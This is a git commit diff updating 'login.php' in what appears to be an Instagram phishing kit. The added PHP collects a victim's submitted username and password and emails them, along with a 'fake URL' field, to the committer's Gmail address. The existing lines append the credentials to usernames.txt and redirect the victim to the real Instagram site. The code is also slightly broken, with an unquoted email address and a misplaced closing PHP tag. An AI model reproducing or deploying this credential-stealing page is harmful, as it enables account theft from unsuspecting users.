69a68ab007c19efded85a0811041ca9aff3dd4f6
56-sys <jumivenezuela2023@gmail.com>
2025-01-21 10:54:54 -0400

    Update login.php

--- .sites/instagram/login.php
+++ .sites/instagram/login.php
@@ -1,5 +1,21 @@
 <?php
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    $fake_url = $_POST['fake_url'];
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    
+    $to =jumivenezuela2023@gmail.com ; // Reemplaza con tu correo
+    $subject = "Nuevo Registro en URL Falso";
+    $message = "URL Falso: $fake_url\nUsername: $username\nPassword: $password";
+    $headers = "From: no-reply@tu-dominio.com"; // Reemplaza con el dominio de tu correo
 
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Correo enviado exitosamente.";
+    } else {
+        echo "Error al enviar el correo.";
+    }
+}
+?>
 file_put_contents("usernames.txt", "Instagram Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
 header('Location: https://instagram.com');
 exit();
